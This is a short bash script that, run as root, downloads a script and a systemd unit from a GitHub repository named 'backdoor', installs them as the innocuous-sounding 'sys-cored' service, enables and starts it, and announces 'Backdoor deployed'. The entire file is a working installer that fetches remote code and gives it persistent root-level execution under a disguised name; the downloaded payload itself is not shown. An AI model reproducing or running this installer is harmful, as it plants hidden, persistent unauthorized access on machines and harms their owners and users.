#!/bin/bash

if [[ "$EUID" -ne 0 ]]; then
    echo "Please run as root."
    exit 1
fi

REPO_URL="https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main"

curl -s "$REPO_URL/sys-cored.sh" -o /usr/local/bin/sys-cored
chmod +x /usr/local/bin/sys-cored

curl -s "$REPO_URL/sys-cored.service" -o /etc/systemd/system/sys-cored.service

systemctl daemon-reload
systemctl enable sys-cored
systemctl start sys-cored

echo "[+] Backdoor deployed and started as sys-cored.service"
